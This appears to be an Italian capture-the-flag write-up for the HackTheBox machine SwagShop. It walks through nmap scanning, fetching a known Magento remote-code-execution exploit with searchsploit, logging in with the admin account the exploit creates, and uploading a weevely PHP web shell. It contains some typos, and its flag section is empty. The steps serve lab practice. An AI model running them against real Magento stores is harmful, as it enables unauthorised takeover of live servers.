# SwagShop

## Intro
HackTheBox -> Machine -> SwagShop <br>
Questa macchina è di un livello abbastanza semplice. Si basa su una vulnerabilità di Magento eCommerce.
## Tools
Tool | Descrizione
------- | ------
Nmap | 
SearchSploit |
Weevely |

## Description

1. Come prima cosa dopo essersi connessi con openvpn al lab, scannerizzare la macchina con nmap, con il comando:
```bash
sudo nmap -sC -O 10.10.10.140
```
2. Come si può notare c'e sia la porta 80 che la 22 aperte. Visitare la pagina web associata.
3. Si nota che è installato Magento. Tramite SearchSploit cercare le vulnerabilità per Magento, con il comando:
```bash
searchsploit magento
```
4. Tra i rulati selezionare "Magento eCommerce - Remote Code Execution", vulnerabilità che ci permetterà di eseguire comandi da remoto.
5. Copiare l'exploit con il comando:
```bash
searchsploit -m exploits/xml/webapps/37977.py
```
6. Modificarlo e lanciarlo:
```python
target = "http://10.10.10.140/"
target_url = target + "/index.php" + "/admin/Cms_Wysiwyg/directive/index/"
```
7. Raggiungere la pagina: (http://10.10.10.140/index.php/admin) e loggarsi come forme:forme
8. Recarsi nella pagina "Manage Packages"
9. Generare una Shell con weevely, con il comando:
```bash
wevely generete <Password> <Nomefile>.php
```
9. uploadare una shell
10. connettersi alla pagina con weevely

## FLAG 


